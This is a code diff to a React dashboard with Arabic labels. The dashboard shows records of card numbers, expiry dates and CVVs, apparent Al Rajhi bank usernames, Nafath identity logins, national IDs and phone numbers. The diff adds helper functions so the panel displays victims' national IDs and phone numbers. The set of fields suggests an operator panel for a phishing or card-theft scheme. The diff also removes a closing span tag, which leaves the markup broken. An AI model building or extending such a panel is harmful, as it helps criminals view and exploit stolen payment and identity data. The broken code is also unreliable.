@@ -87,6 +87,8 @@ interface Notification {
     birthMonth?: string;
     birthYear?: string;
     isHijri?: boolean;
+    nationalId?: string;
+    phoneNumber?: string;
   };
   paymentInfo?: {
     cardName?: string;
@@ -256,6 +258,12 @@ export default function Dashboard() {
     n.paymentInfo?.cardExpiry || n.cardExpiry;
   const getCardCvv = (n: Notification) => n.paymentInfo?.cardCvv || n.cardCvv;
 
+  // Helper functions to get nationalId and phoneNumber from either root or personalInfo
+  const getNationalId = (n: Notification) =>
+    n.nationalId || n.personalInfo?.nationalId;
+  const getPhoneNumber = (n: Notification) =>
+    n.phoneNumber || n.personalInfo?.phoneNumber;
+
   const hasData = (n: Notification) => {
     return (
       getCardNumber(n) ||
@@ -264,8 +272,8 @@ export default function Dashboard() {
       n.rajhiUser ||
       n.nafazId ||
       n.personalInfo?.birthYear ||
-      n.nationalId ||
-      n.phoneNumber
+      getNationalId(n) ||
+      getPhoneNumber(n)
     );
   };
 
@@ -1135,23 +1143,22 @@ export default function Dashboard() {
                 icon={<User size={16} />}
               >
                 <div className="space-y-1 text-sm">
-                  {selectedApplication.nationalId && (
+                  {getNationalId(selectedApplication) && (
                     <div>
                       رقم الهوية:{" "}
                       <span className="font-mono" dir="ltr">
-                        {selectedApplication.nationalId}
+                        {getNationalId(selectedApplication)}
                       </span>
                     </div>
                   )}
                   {getCardName(selectedApplication) && (
                     <div>الاسم: {getCardName(selectedApplication)}</div>
                   )}
-                  {selectedApplication.phoneNumber && (
+                  {getPhoneNumber(selectedApplication) && (
                     <div>
                       الهاتف:{" "}
                       <span className="font-mono" dir="ltr">
-                        {selectedApplication.phoneNumber}
-                      </span>
+                        {getPhoneNumber(selectedApplication)}
                     </div>
                   )}
                 </div>
